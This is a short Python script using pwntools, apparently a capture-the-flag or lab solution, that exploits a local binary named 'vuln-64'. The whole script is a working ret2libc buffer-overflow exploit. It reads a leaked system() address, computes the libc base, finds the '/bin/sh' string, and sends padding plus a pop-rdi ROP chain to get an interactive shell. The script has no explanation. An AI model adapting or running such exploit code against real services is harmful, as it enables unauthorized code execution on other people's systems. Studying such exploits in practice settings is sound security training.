from pwn import *

exe='./vuln-64'
elf=context.binary=ELF(exe)

libc=elf.libc

p=process()

p.recvuntil(b':')

system_address=int(p.recvline(),16)

info(f"The system address is: {hex(system_address)}")

libc.address=system_address-libc.sym["system"]

binsh=next(libc.search(b"/bin/sh\x00"))

info(f"The address of string /bin/sh : {hex(binsh)}")
offset=40

pop_rdi=0x4011db

payload=flat(
    b"A"*offset,
    pop_rdi+1,
    pop_rdi,
    binsh,
    libc.sym["system"],
    0x0
)

p.sendline(payload)

p.interactive()